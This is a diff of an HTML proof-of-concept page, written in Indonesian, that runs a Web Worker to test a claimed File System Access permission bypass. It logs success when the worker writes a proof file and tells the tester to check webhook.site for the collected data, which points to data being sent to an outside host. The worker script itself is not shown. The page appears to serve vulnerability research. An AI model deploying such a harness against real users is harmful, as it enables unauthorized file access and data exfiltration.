@@ -1,25 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>FSA Worker Bypass PoC</title>
+  <title>FSA Worker Bypass - Full Test</title>
+  <style>
+    body { font-family: monospace; padding: 20px; background: #000; color: #0f0; }
+    button { padding: 10px 20px; font-size: 18px; margin: 10px 0; }
+    #log { background: #001100; padding: 10px; height: 200px; overflow: auto; border: 1px solid #0f0; }
+  </style>
 </head>
 <body>
-  <h2>🔍 Uji FSA Permission Bypass via Web Worker</h2>
-  <button id="test">🚀 Jalankan Test</button>
-  <pre id="result"></pre>
+  <h2>💥 Uji Bug: Akses File System Tanpa Izin via Web Worker</h2>
+  <button id="testBtn">🚀 Jalankan Test</button>
+  <div id="log"></div>
 
   <script>
-    document.getElementById('test').addEventListener('click', () => {
-      const worker = new Worker('https://lanaya113505.github.io/pizza/worker-fs-bypass.js');
+    const log = document.getElementById('log');
+    const logMsg = (msg) => {
+      log.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+      log.scrollTop = log.scrollHeight;
+    };
+
+    document.getElementById('testBtn').addEventListener('click', () => {
+      log.innerHTML = '';
+      logMsg('Memulai uji bug...');
+
+      // Buat Web Worker
+      const worker = new Worker('worker-fsa-bypass.js');
+      
       worker.onmessage = (e) => {
-        const output = document.getElementById('result');
         if (e.data.success) {
-          output.style.color = 'green';
+          logMsg('✅ SUKSES!');
+          logMsg(`Origin: ${e.data.origin}`);
+          logMsg('File "fsa_bypass_proof.txt" dibuat di file system sandboxed.');
+          logMsg('Cek webhook.site untuk data lengkap.');
         } else {
-          output.style.color = 'red';
+          logMsg('❌ GAGAL:');
+          logMsg(e.data.message);
+          if (e.data.error) logMsg(e.data.error);
         }
-        output.textContent = e.data.message + '\n\n' + (e.data.content || '');
       };
+
       worker.postMessage('start');
     });
   </script>
